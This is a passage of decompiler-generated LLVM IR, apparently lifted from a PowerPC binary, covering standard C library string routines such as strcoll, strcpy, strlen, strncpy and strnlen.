  %v1_10009f04 = add i32 %v0_10009f18, 2
  %v1_10009f08 = add i32 %v0_10009f18, 3
  %v4_10009f0c = icmp eq i32 %v4_10009f00, %v0_10009ea8
  br i1 %v4_10009f0c, label %dec_label_pc_10009f18, label %dec_label_pc_10009f20

dec_label_pc_10009f18:                            ; preds = %dec_label_pc_10009f00
  ret i32 %v0_10009f18

dec_label_pc_10009f20:                            ; preds = %dec_label_pc_10009f00
  %v3_10009f10 = icmp eq i8 %v3_10009f00, 0
  br i1 %v3_10009f10, label %dec_label_pc_10009f78, label %dec_label_pc_10009f24

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009f20
  %v2_10009f24 = inttoptr i32 %v1_10009ef4 to i8*
  %v3_10009f24 = load i8, i8* %v2_10009f24, align 1
  %v4_10009f24 = zext i8 %v3_10009f24 to i32
  %v4_10009f28 = icmp eq i32 %v4_10009f24, %v0_10009ea8
  br i1 %v4_10009f28, label %dec_label_pc_10009f34, label %dec_label_pc_10009f3c

dec_label_pc_10009f34:                            ; preds = %dec_label_pc_10009f24
  ret i32 %v1_10009ef4

dec_label_pc_10009f3c:                            ; preds = %dec_label_pc_10009f24
  %v3_10009f2c = icmp eq i8 %v3_10009f24, 0
  br i1 %v3_10009f2c, label %dec_label_pc_10009f78, label %dec_label_pc_10009f40

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009f3c
  %v2_10009f40 = inttoptr i32 %v1_10009f04 to i8*
  %v3_10009f40 = load i8, i8* %v2_10009f40, align 1
  %v4_10009f40 = zext i8 %v3_10009f40 to i32
  %v4_10009f44 = icmp eq i32 %v4_10009f40, %v0_10009ea8
  br i1 %v4_10009f44, label %dec_label_pc_10009f50, label %dec_label_pc_10009f58

dec_label_pc_10009f50:                            ; preds = %dec_label_pc_10009f40
  ret i32 %v1_10009f04

dec_label_pc_10009f58:                            ; preds = %dec_label_pc_10009f40
  %v3_10009f48 = icmp eq i8 %v3_10009f40, 0
  br i1 %v3_10009f48, label %dec_label_pc_10009f78, label %dec_label_pc_10009f5c

dec_label_pc_10009f5c:                            ; preds = %dec_label_pc_10009f58
  %v2_10009f5c = inttoptr i32 %v1_10009f08 to i8*
  %v3_10009f5c = load i8, i8* %v2_10009f5c, align 1
  %v4_10009f5c = zext i8 %v3_10009f5c to i32
  %v4_10009f60 = icmp eq i32 %v4_10009f5c, %v0_10009ea8
  br i1 %v4_10009f60, label %dec_label_pc_10009f6c, label %dec_label_pc_10009f74

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f5c
  ret i32 %v1_10009f08

dec_label_pc_10009f74:                            ; preds = %dec_label_pc_10009f5c
  %v3_10009f64 = icmp eq i8 %v3_10009f5c, 0
  br i1 %v3_10009f64, label %dec_label_pc_10009f78, label %dec_label_pc_10009ec0

dec_label_pc_10009f78:                            ; preds = %dec_label_pc_10009e88, %dec_label_pc_10009f74, %dec_label_pc_10009f58, %dec_label_pc_10009f3c, %dec_label_pc_10009f20
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10009ec4, { 1, 0 }
  uselistorder i32 %v2_10009ec0, { 0, 2, 1 }
  uselistorder i32 %v0_10009f18, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_10009eb0, { 1, 0 }
  uselistorder i32 %v0_10009ea8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009e9c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10009ea02, { 2, 1, 0 }
  uselistorder i32 %v1_10009e80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009f78, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10009ec0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009e88, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10009f8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10009f84

dec_label_pc_10009f84:                            ; preds = %dec_label_pc_10009fa8, %entry
  %v0_10009f8c = phi i32 [ %v1_10009f90, %dec_label_pc_10009fa8 ], [ %v0_10009f8c.pre, %entry ]
  %v0_10009f84 = phi i32 [ %v1_10009f88, %dec_label_pc_10009fa8 ], [ %tmp, %entry ]
  %v1_10009f84 = inttoptr i32 %v0_10009f84 to i8*
  %v2_10009f84 = load i8, i8* %v1_10009f84, align 1
  %v3_10009f84 = zext i8 %v2_10009f84 to i32
  %v1_10009f8c = inttoptr i32 %v0_10009f8c to i8*
  %v2_10009f8c = load i8, i8* %v1_10009f8c, align 1
  %v3_10009f8c = zext i8 %v2_10009f8c to i32
  %v3_10009f94 = icmp eq i8 %v2_10009f84, 0
  br i1 %v3_10009f94, label %dec_label_pc_10009fa0, label %dec_label_pc_10009fa8

dec_label_pc_10009fa0:                            ; preds = %dec_label_pc_10009f84
  %v1_10009fa0 = sub nsw i32 0, %v3_10009f8c
  ret i32 %v1_10009fa0

dec_label_pc_10009fa8:                            ; preds = %dec_label_pc_10009f84
  %v4_10009f98 = icmp eq i8 %v2_10009f84, %v2_10009f8c
  %v1_10009f90 = add i32 %v0_10009f8c, 1
  %v1_10009f88 = add i32 %v0_10009f84, 1
  br i1 %v4_10009f98, label %dec_label_pc_10009f84, label %dec_label_pc_10009fac

dec_label_pc_10009fac:                            ; preds = %dec_label_pc_10009fa8
  %v2_10009fac = sub nsw i32 %v3_10009f84, %v3_10009f8c
  ret i32 %v2_10009fac

; uselistorder directives
  uselistorder i32 %v3_10009f8c, { 1, 0 }
  uselistorder i32 %v0_10009f84, { 1, 0 }
  uselistorder i32 %v0_10009f8c, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10009fb4 = add i32 %arg1, -1
  %v1_10009fb8 = sub i32 %v2_10009fb4, %tmp
  store i32 %v1_10009fb8, i32* %r9.global-to-local, align 4
  %v2_10009fbc4 = load i8, i8* %arg2, align 1
  %v1_10009fc06 = add i32 %tmp, 1
  store i32 %v1_10009fc06, i32* %r4.global-to-local, align 4
  %v3_10009fc48 = icmp eq i8 %v2_10009fbc4, 0
  store i1 %v3_10009fc48, i1* %cr7_eq.global-to-local, align 1
  %v5_10009fc89 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10009fbc4, i8* %v5_10009fc89, align 1
  %v0_10009fcc10 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009fcc10, label %dec_label_pc_10009fd0, label %dec_label_pc_10009fbc.dec_label_pc_10009fbc_crit_edge

dec_label_pc_10009fbc.dec_label_pc_10009fbc_crit_edge: ; preds = %entry, %dec_label_pc_10009fbc.dec_label_pc_10009fbc_crit_edge
  %v0_10009fbc.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10009fc8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10009fbc = inttoptr i32 %v0_10009fbc.pre to i8*
  %v2_10009fbc = load i8, i8* %v1_10009fbc, align 1
  %v1_10009fc0 = add i32 %v0_10009fbc.pre, 1
  store i32 %v1_10009fc0, i32* %r4.global-to-local, align 4
  %v3_10009fc4 = icmp eq i8 %v2_10009fbc, 0
  store i1 %v3_10009fc4, i1* %cr7_eq.global-to-local, align 1
  %v4_10009fc8 = add i32 %v1_10009fc0, %v2_10009fc8.pre
  %v5_10009fc8 = inttoptr i32 %v4_10009fc8 to i8*
  store i8 %v2_10009fbc, i8* %v5_10009fc8, align 1
  %v0_10009fcc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009fcc, label %dec_label_pc_10009fd0, label %dec_label_pc_10009fbc.dec_label_pc_10009fbc_crit_edge

dec_label_pc_10009fd0:                            ; preds = %dec_label_pc_10009fbc.dec_label_pc_10009fbc_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009fbc.dec_label_pc_10009fbc_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_10009fd4 = load i32, i32* @r3, align 4
  %v1_10009fec3 = urem i32 %v0_10009fd4, 4
  %v3_10009fec5 = icmp eq i32 %v1_10009fec3, 0
  br i1 %v3_10009fec5, label %dec_label_pc_10009ff4, label %dec_label_pc_10009fdc

dec_label_pc_10009fdc:                            ; preds = %entry, %dec_label_pc_10009fe8
  %v0_10009fe8 = phi i32 [ %v1_10009fe8, %dec_label_pc_10009fe8 ], [ %v0_10009fd4, %entry ]
  %v1_10009fdc = inttoptr i32 %v0_10009fe8 to i8*
  %v2_10009fdc = load i8, i8* %v1_10009fdc, align 1
  %v3_10009fe0 = icmp eq i8 %v2_10009fdc, 0
  br i1 %v3_10009fe0, label %dec_label_pc_1000a028, label %dec_label_pc_10009fe8

dec_label_pc_10009fe8:                            ; preds = %dec_label_pc_10009fdc
  %v1_10009fe8 = add i32 %v0_10009fe8, 1
  %v1_10009fec = urem i32 %v1_10009fe8, 4
  %v3_10009fec = icmp eq i32 %v1_10009fec, 0
  br i1 %v3_10009fec, label %dec_label_pc_10009ff4, label %dec_label_pc_10009fdc

dec_label_pc_10009ff4:                            ; preds = %dec_label_pc_10009fe8, %entry
  %v0_10009ff8 = phi i32 [ %v0_10009fd4, %entry ], [ %v1_10009fe8, %dec_label_pc_10009fe8 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000a000

dec_label_pc_1000a000:                            ; preds = %dec_label_pc_1000a060, %dec_label_pc_1000a000, %dec_label_pc_10009ff4
  %v1_1000a03c = phi i32 [ %v0_10009ff8, %dec_label_pc_10009ff4 ], [ %v1_1000a004, %dec_label_pc_1000a000 ], [ %v1_1000a004, %dec_label_pc_1000a060 ]
  %v1_1000a000 = inttoptr i32 %v1_1000a03c to i32*
  %v2_1000a000 = load i32, i32* %v1_1000a000, align 4
  %v1_1000a004 = add i32 %v1_1000a03c, 4
  %v1_1000a010 = add i32 %v2_1000a000, -16843009
  %v2_1000a014 = and i32 %v1_1000a010, -2139062144
  %v5_1000a014 = icmp eq i32 %v2_1000a014, 0
  br i1 %v5_1000a014, label %dec_label_pc_1000a000, label %dec_label_pc_1000a01c

dec_label_pc_1000a01c:                            ; preds = %dec_label_pc_1000a000
  %v2_1000a01c = inttoptr i32 %v1_1000a03c to i8*
  %v3_1000a01c = load i8, i8* %v2_1000a01c, align 1
  %v3_1000a020 = icmp eq i8 %v3_1000a01c, 0
  br i1 %v3_1000a020, label %dec_label_pc_1000a028, label %dec_label_pc_1000a030

dec_label_pc_1000a028:                            ; preds = %dec_label_pc_10009fdc, %dec_label_pc_1000a01c
  %v1_1000a028 = phi i32 [ %v1_1000a03c, %dec_label_pc_1000a01c ], [ %v0_10009fe8, %dec_label_pc_10009fdc ]
  %v2_1000a028 = sub i32 %v1_1000a028, %v0_10009fd4
  ret i32 %v2_1000a028

dec_label_pc_1000a030:                            ; preds = %dec_label_pc_1000a01c
  %v1_1000a030 = add i32 %v1_1000a03c, 1
  %v2_1000a030 = inttoptr i32 %v1_1000a030 to i8*
  %v3_1000a030 = load i8, i8* %v2_1000a030, align 1
  %v3_1000a034 = icmp eq i8 %v3_1000a030, 0
  br i1 %v3_1000a034, label %dec_label_pc_1000a03c, label %dec_label_pc_1000a048

dec_label_pc_1000a03c:                            ; preds = %dec_label_pc_1000a030
  %v2_1000a03c = sub i32 %v1_1000a03c, %v0_10009fd4
  %v1_1000a040 = add i32 %v2_1000a03c, 1
  ret i32 %v1_1000a040

dec_label_pc_1000a048:                            ; preds = %dec_label_pc_1000a030
  %v1_1000a048 = add i32 %v1_1000a03c, 2
  %v2_1000a048 = inttoptr i32 %v1_1000a048 to i8*
  %v3_1000a048 = load i8, i8* %v2_1000a048, align 1
  %v3_1000a04c = icmp eq i8 %v3_1000a048, 0
  br i1 %v3_1000a04c, label %dec_label_pc_1000a054, label %dec_label_pc_1000a060

dec_label_pc_1000a054:                            ; preds = %dec_label_pc_1000a048
  %v2_1000a054 = sub i32 %v1_1000a03c, %v0_10009fd4
  %v1_1000a058 = add i32 %v2_1000a054, 2
  ret i32 %v1_1000a058

dec_label_pc_1000a060:                            ; preds = %dec_label_pc_1000a048
  %v1_1000a060 = add i32 %v1_1000a03c, 3
  %v2_1000a060 = inttoptr i32 %v1_1000a060 to i8*
  %v3_1000a060 = load i8, i8* %v2_1000a060, align 1
  %v3_1000a064 = icmp eq i8 %v3_1000a060, 0
  br i1 %v3_1000a064, label %dec_label_pc_1000a06c, label %dec_label_pc_1000a000

dec_label_pc_1000a06c:                            ; preds = %dec_label_pc_1000a060
  %v2_1000a06c = sub i32 %v1_1000a03c, %v0_10009fd4
  %v1_1000a070 = add i32 %v2_1000a06c, 3
  ret i32 %v1_1000a070

; uselistorder directives
  uselistorder i32 %v1_1000a004, { 1, 0 }
  uselistorder i32 %v1_1000a03c, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10009fe8, { 1, 0, 2 }
  uselistorder i32 %v0_10009fd4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a028, { 1, 0 }
  uselistorder label %dec_label_pc_10009fdc, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000a078 = icmp eq i32 %arg2, 3
  store i1 %v3_1000a078, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a07c = add i32 %arg1, -1
  store i32 %v1_1000a07c, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000a0f8, label %dec_label_pc_1000a084

dec_label_pc_1000a084:                            ; preds = %entry
  %v1_1000a084 = udiv i32 %arg2, 4
  store i32 %v1_1000a084, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a08c

dec_label_pc_1000a08c:                            ; preds = %dec_label_pc_1000a0dc, %dec_label_pc_1000a084
  %v2_1000a09c = phi i32 [ %v3_1000a0d4, %dec_label_pc_1000a0dc ], [ %v1_1000a07c, %dec_label_pc_1000a084 ]
  %v0_1000a08c = load i32, i32* @r4, align 4
  %v1_1000a08c = inttoptr i32 %v0_1000a08c to i8*
  %v2_1000a08c = load i8, i8* %v1_1000a08c, align 1
  %v1_1000a090 = add i32 %v0_1000a08c, 1
  store i32 %v1_1000a090, i32* %r10.global-to-local, align 4
  %v1_1000a094 = add i32 %v0_1000a08c, 2
  store i32 %v1_1000a094, i32* @r8, align 4
  %v3_1000a098 = icmp eq i8 %v2_1000a08c, 0
  store i1 %v3_1000a098, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a09c = add i32 %v2_1000a09c, 1
  %v4_1000a09c = inttoptr i32 %v3_1000a09c to i8*
  store i8 %v2_1000a08c, i8* %v4_1000a09c, align 1
  store i32 %v3_1000a09c, i32* %r11.global-to-local, align 4
  %v0_1000a0a0 = load i32, i32* @r8, align 4
  %v1_1000a0a0 = add i32 %v0_1000a0a0, 1
  store i32 %v1_1000a0a0, i32* %r9.global-to-local, align 4
  %v0_1000a0a4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a0a4, label %dec_label_pc_1000a0e4, label %dec_label_pc_1000a0a8

dec_label_pc_1000a0a8:                            ; preds = %dec_label_pc_1000a08c
  %v0_1000a0a8 = load i32, i32* @r4, align 4
  %v1_1000a0a8 = add i32 %v0_1000a0a8, 1
  %v2_1000a0a8 = inttoptr i32 %v1_1000a0a8 to i8*
  %v3_1000a0a8 = load i8, i8* %v2_1000a0a8, align 1
  %v1_1000a0ac = add i32 %v0_1000a0a0, 2
  store i32 %v1_1000a0ac, i32* @r4, align 4
  %v3_1000a0b0 = icmp eq i8 %v3_1000a0a8, 0
  store i1 %v3_1000a0b0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a0b4 = add i32 %v2_1000a09c, 2
  %v4_1000a0b4 = inttoptr i32 %v3_1000a0b4 to i8*
  store i8 %v3_1000a0a8, i8* %v4_1000a0b4, align 1
  store i32 %v3_1000a0b4, i32* %r11.global-to-local, align 4
  %v0_1000a0b8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a0b8, label %dec_label_pc_1000a0e4, label %dec_label_pc_1000a0bc

dec_label_pc_1000a0bc:                            ; preds = %dec_label_pc_1000a0a8
  %v0_1000a0bc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a0bc = add i32 %v0_1000a0bc, 1
  %v2_1000a0bc = inttoptr i32 %v1_1000a0bc to i8*
  %v3_1000a0bc = load i8, i8* %v2_1000a0bc, align 1
  %v3_1000a0c0 = icmp eq i8 %v3_1000a0bc, 0
  store i1 %v3_1000a0c0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a0c4 = add i32 %v2_1000a09c, 3
  %v4_1000a0c4 = inttoptr i32 %v3_1000a0c4 to i8*
  store i8 %v3_1000a0bc, i8* %v4_1000a0c4, align 1
  store i32 %v3_1000a0c4, i32* %r11.global-to-local, align 4
  %v0_1000a0c8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a0c8, label %dec_label_pc_1000a0e4, label %dec_label_pc_1000a0cc

dec_label_pc_1000a0cc:                            ; preds = %dec_label_pc_1000a0bc
  %v0_1000a0cc = load i32, i32* @r8, align 4
  %v1_1000a0cc = add i32 %v0_1000a0cc, 1
  %v2_1000a0cc = inttoptr i32 %v1_1000a0cc to i8*
  %v3_1000a0cc = load i8, i8* %v2_1000a0cc, align 1
  %v3_1000a0d0 = icmp eq i8 %v3_1000a0cc, 0
  store i1 %v3_1000a0d0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a0d4 = add i32 %v2_1000a09c, 4
  %v4_1000a0d4 = inttoptr i32 %v3_1000a0d4 to i8*
  store i8 %v3_1000a0cc, i8* %v4_1000a0d4, align 1
  store i32 %v3_1000a0d4, i32* %r11.global-to-local, align 4
  %v0_1000a0d8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a0d8, label %dec_label_pc_1000a0e4, label %dec_label_pc_1000a0dc

dec_label_pc_1000a0dc:                            ; preds = %dec_label_pc_1000a0cc
  %v0_1000a0dc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a0dc = add i32 %v0_1000a0dc, -1
  store i32 %v1_1000a0dc, i32* %ctr.global-to-local, align 4
  %v2_1000a0dc = icmp eq i32 %v1_1000a0dc, 0
  br i1 %v2_1000a0dc, label %dec_label_pc_1000a0f8, label %dec_label_pc_1000a08c

dec_label_pc_1000a0e4:                            ; preds = %dec_label_pc_1000a0cc, %dec_label_pc_1000a0bc, %dec_label_pc_1000a0a8, %dec_label_pc_1000a08c
  %v1_1000a0e4 = phi i32 [ %v3_1000a0d4, %dec_label_pc_1000a0cc ], [ %v3_1000a0c4, %dec_label_pc_1000a0bc ], [ %v3_1000a0b4, %dec_label_pc_1000a0a8 ], [ %v3_1000a09c, %dec_label_pc_1000a08c ]
  %v2_1000a0e411 = sub i32 %arg1, %v1_1000a0e4
  %v2_1000a0e8 = add i32 %v2_1000a0e411, %arg2
  %v1_1000a0ec = add i32 %v2_1000a0e8, -1
  store i32 %v1_1000a0ec, i32* %r9.global-to-local, align 4
  %v4_1000a0ec = icmp eq i32 %v1_1000a0ec, 0
  %v0_1000a0f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a0ec, i32 %v0_1000a0f0)
  %v2_1000a128.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a120

dec_label_pc_1000a0f8:                            ; preds = %dec_label_pc_1000a0dc, %entry
  %v1_1000a0f8 = urem i32 %arg2, 4
  store i32 %v1_1000a0f8, i32* %r9.global-to-local, align 4
  %v3_1000a0f8 = icmp eq i32 %v1_1000a0f8, 0
  %v0_1000a0fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a0f8, i32 %v0_1000a0fc)
  store i32 %v1_1000a0f8, i32* %ctr.global-to-local, align 4
  %v2_1000a114.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a104

dec_label_pc_1000a104:                            ; preds = %dec_label_pc_1000a11c.dec_label_pc_1000a104_crit_edge, %dec_label_pc_1000a0f8
  %v2_1000a114 = phi i32 [ %v3_1000a114, %dec_label_pc_1000a11c.dec_label_pc_1000a104_crit_edge ], [ %v2_1000a114.pre, %dec_label_pc_1000a0f8 ]
  %v0_1000a108 = phi i32 [ %v0_1000a108.pre, %dec_label_pc_1000a11c.dec_label_pc_1000a104_crit_edge ], [ %v1_1000a0f8, %dec_label_pc_1000a0f8 ]
  %v0_1000a104 = load i32, i32* @r4, align 4
  %v1_1000a104 = inttoptr i32 %v0_1000a104 to i8*
  %v2_1000a104 = load i8, i8* %v1_1000a104, align 1
  %v1_1000a108 = add i32 %v0_1000a108, -1
  store i32 %v1_1000a108, i32* %r9.global-to-local, align 4
  %v1_1000a10c = add i32 %v0_1000a104, 1
  store i32 %v1_1000a10c, i32* @r4, align 4
  %v3_1000a110 = icmp eq i8 %v2_1000a104, 0
  store i1 %v3_1000a110, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a114 = add i32 %v2_1000a114, 1
  %v4_1000a114 = inttoptr i32 %v3_1000a114 to i8*
  store i8 %v2_1000a104, i8* %v4_1000a114, align 1
  store i32 %v3_1000a114, i32* %r11.global-to-local, align 4
  %v0_1000a118 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a118 = add i32 %v0_1000a118, -1
  store i32 %v1_1000a118, i32* %ctr.global-to-local, align 4
  %v2_1000a118 = icmp eq i32 %v1_1000a118, 0
  br i1 %v2_1000a118, label %dec_label_pc_1000a130, label %dec_label_pc_1000a11c

dec_label_pc_1000a11c:                            ; preds = %dec_label_pc_1000a104
  %v0_1000a11c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a11c, label %dec_label_pc_1000a120, label %dec_label_pc_1000a11c.dec_label_pc_1000a104_crit_edge

dec_label_pc_1000a11c.dec_label_pc_1000a104_crit_edge: ; preds = %dec_label_pc_1000a11c
  %v0_1000a108.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a104

dec_label_pc_1000a120:                            ; preds = %dec_label_pc_1000a11c, %dec_label_pc_1000a0e4
  %v2_1000a128.pre = phi i32 [ %v2_1000a128.pre.pre, %dec_label_pc_1000a0e4 ], [ %v3_1000a114, %dec_label_pc_1000a11c ]
  %v0_1000a120 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000a120, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a124

dec_label_pc_1000a124:                            ; preds = %dec_label_pc_1000a124, %dec_label_pc_1000a120
  %v2_1000a128 = phi i32 [ %v3_1000a128, %dec_label_pc_1000a124 ], [ %v2_1000a128.pre, %dec_label_pc_1000a120 ]
  %v3_1000a128 = add i32 %v2_1000a128, 1
  %v4_1000a128 = inttoptr i32 %v3_1000a128 to i8*
  store i8 0, i8* %v4_1000a128, align 1
  store i32 %v3_1000a128, i32* %r11.global-to-local, align 4
  %v0_1000a12c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a12c = add i32 %v0_1000a12c, -1
  store i32 %v1_1000a12c, i32* %ctr.global-to-local, align 4
  %v2_1000a12c = icmp eq i32 %v1_1000a12c, 0
  br i1 %v2_1000a12c, label %dec_label_pc_1000a130, label %dec_label_pc_1000a124

dec_label_pc_1000a130:                            ; preds = %dec_label_pc_1000a104, %dec_label_pc_1000a124
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000a12c, { 1, 0 }
  uselistorder i32 %v3_1000a128, { 1, 2, 0 }
  uselistorder i32 %v1_1000a118, { 1, 0 }
  uselistorder i32 %v3_1000a114, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000a0f8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000a0dc, { 1, 0 }
  uselistorder i32 %v3_1000a0d4, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a130, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000a134 = load i32, i32* @r4, align 4
  %v3_1000a134 = icmp eq i32 %v0_1000a134, 0
  %v0_1000a140 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a134, i32 %v0_1000a140)
  %v1_1000a150 = load i32, i32* @r4, align 4
  %v2_1000a150 = add i32 %v1_1000a150, %tmp
  %v3_1000a154 = icmp ugt i32 %v2_1000a150, %tmp
  %v4_1000a154 = icmp eq i32 %v1_1000a150, 0
  %v2_1000a158 = or i1 %v4_1000a154, %v3_1000a154
  br i1 %v2_1000a158, label %dec_label_pc_1000a160, label %dec_label_pc_1000a15c

dec_label_pc_1000a148:                            ; preds = %dec_label_pc_1000a1c8
  br label %dec_label_pc_1000a20c

dec_label_pc_1000a15c:                            ; preds = %entry
  br label %dec_label_pc_1000a160

dec_label_pc_1000a160:                            ; preds = %entry, %dec_label_pc_1000a15c
  %v0_1000a210 = phi i32 [ %v2_1000a150, %entry ], [ -1, %dec_label_pc_1000a15c ]
  %v1_1000a1906 = urem i32 %tmp, 4
  %v3_1000a1908 = icmp eq i32 %v1_1000a1906, 0
  br i1 %v3_1000a1908, label %dec_label_pc_1000a198, label %dec_label_pc_1000a168

dec_label_pc_1000a168:                            ; preds = %dec_label_pc_1000a160, %dec_label_pc_1000a18c
  %v0_1000a180 = phi i32 [ %v1_1000a18c, %dec_label_pc_1000a18c ], [ %tmp, %dec_label_pc_1000a160 ]
  %v1_1000a168 = inttoptr i32 %v0_1000a180 to i8*
  %v2_1000a168 = load i8, i8* %v1_1000a168, align 1
  %v3_1000a16c = icmp eq i8 %v2_1000a168, 0
  br i1 %v3_1000a16c, label %dec_label_pc_1000a174, label %dec_label_pc_1000a18c

dec_label_pc_1000a174:                            ; preds = %dec_label_pc_1000a168
  %v3_1000a174 = icmp ugt i32 %v0_1000a210, %v0_1000a180
  %v0_1000a180.v0_1000a210 = select i1 %v3_1000a174, i32 %v0_1000a180, i32 %v0_1000a210
  %v2_1000a184 = sub i32 %v0_1000a180.v0_1000a210, %tmp
  ret i32 %v2_1000a184

dec_label_pc_1000a18c:                            ; preds = %dec_label_pc_1000a168
  %v1_1000a18c = add i32 %v0_1000a180, 1
  %v1_1000a190 = urem i32 %v1_1000a18c, 4
  %v3_1000a190 = icmp eq i32 %v1_1000a190, 0
  br i1 %v3_1000a190, label %dec_label_pc_1000a198, label %dec_label_pc_1000a168

dec_label_pc_1000a198:                            ; preds = %dec_label_pc_1000a18c, %dec_label_pc_1000a160
  %v0_1000a19c = phi i32 [ %tmp, %dec_label_pc_1000a160 ], [ %v1_1000a18c, %dec_label_pc_1000a18c ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000a2043 = icmp ult i32 %v0_1000a19c, %v0_1000a210
  br i1 %v2_1000a2043, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a20c

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a198, %dec_label_pc_1000a200
  %v0_1000a148 = phi i32 [ %v1_1000a1ac, %dec_label_pc_1000a200 ], [ %v0_1000a19c, %dec_label_pc_1000a198 ]
  %v1_1000a1a8 = inttoptr i32 %v0_1000a148 to i32*
  %v2_1000a1a8 = load i32, i32* %v1_1000a1a8, align 4
  %v1_1000a1ac = add i32 %v0_1000a148, 4
  store i32 %v0_1000a148, i32* @r8, align 4
  %v1_1000a1b8 = add i32 %v2_1000a1a8, -16843009
  %v2_1000a1bc = and i32 %v1_1000a1b8, -2139062144
  %v5_1000a1bc = icmp eq i32 %v2_1000a1bc, 0
  %v1_1000a1c0 = add i32 %v0_1000a148, 1
  br i1 %v5_1000a1bc, label %dec_label_pc_1000a200, label %dec_label_pc_1000a1c8

dec_label_pc_1000a1c8:                            ; preds = %dec_label_pc_1000a1a8
  %v2_1000a1c8 = inttoptr i32 %v0_1000a148 to i8*
  %v3_1000a1c8 = load i8, i8* %v2_1000a1c8, align 1
  %v3_1000a1cc = icmp eq i8 %v3_1000a1c8, 0
  br i1 %v3_1000a1cc, label %dec_label_pc_1000a148, label %dec_label_pc_1000a1d4

dec_label_pc_1000a1d4:                            ; preds = %dec_label_pc_1000a1c8
  %v2_1000a1d4 = inttoptr i32 %v1_1000a1c0 to i8*
  %v3_1000a1d4 = load i8, i8* %v2_1000a1d4, align 1
  %v3_1000a1d8 = icmp eq i8 %v3_1000a1d4, 0
  br i1 %v3_1000a1d8, label %dec_label_pc_1000a20c, label %dec_label_pc_1000a1e0

dec_label_pc_1000a1e0:                            ; preds = %dec_label_pc_1000a1d4
